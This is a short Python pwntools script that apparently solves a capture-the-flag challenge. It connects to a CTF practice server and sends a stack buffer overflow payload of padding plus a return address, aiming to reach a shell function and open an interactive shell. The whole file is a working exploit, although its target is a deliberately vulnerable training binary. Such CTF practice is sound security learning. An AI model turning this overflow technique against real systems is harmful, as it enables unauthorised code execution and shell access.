from pwn import *

context(arch="amd64", os="linux", log_level="info")

shell_addr = 0x400730
#io = process("./r3m4ke1t")
io = connect("node4.anna.nssctf.cn", 22667)

payload = b"a" * (0x20 + 0x8) + p64(shell_addr)
io.sendline(payload)
io.interactive()

